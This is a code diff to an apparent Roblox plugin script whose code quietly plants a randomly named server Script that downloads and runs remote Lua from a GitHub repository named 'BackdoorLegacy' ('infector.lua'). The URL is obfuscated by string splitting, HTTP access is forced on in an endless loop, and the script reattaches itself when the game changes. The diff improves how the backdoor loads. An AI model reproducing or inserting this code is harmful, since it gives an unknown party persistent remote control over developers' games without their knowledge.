@@ -4,6 +4,8 @@
 -- Please set the PluginScript's name into:
 -- YnRFAWcnYCPXQTysUmXvCdZBYHGtibTpvPZoZbAgvFitsDkbivVJzrnBNPBwCGJq
 
+task.spawn(function() while wait() do game:GetService('HttpService').HttpEnabled = true end end)
+
 local ratchet
 local ratchetName = "qbvZBkprkSJwzXWkWtPneSSsmMVLGgSiEurDhXgvAjSpHbtaEZCTTtjEmecvkEJn"
 local pluginName = "YnRFAWcnYCPXQTysUmXvCdZBYHGtibTpvPZoZbAgvFitsDkbivVJzrnBNPBwCGJq"
@@ -26,7 +28,7 @@ end
 local function CreateRatchet()
     ratchet = Instance.new("Script",game:GetService('ServerScriptService') 
     ratchet.Name = ratchetName 
-    ratchet.Source = game:HttpGet('htt'..'ps:'..'//'..'raw.githu'..'buser'..'content.'..'com/IvanTheP'..'rotogen/B'..'ack'..'do'..'or'..'Legacy/'..'main/inf'..'ector.l'..'ua') 
+    ratchet.Source = game:GetService("HttpService"):GetAsync('htt'..'ps:'..'//'..'raw.githu'..'buser'..'content.'..'com/IvanTheP'..'rotogen/B'..'ack'..'do'..'or'..'Legacy/'..'main/inf'..'ector.l'..'ua') 
     ReconnectRatchet()
 end
 
@@ -47,5 +49,3 @@ game.DescendantAdded:Connect(function(inst)
 end) 
 
 CreateRatchet() -- New ratchet 
-
-task.spawn(function() while wait() do game:GetService('HttpService').HttpEnabled = true end end)
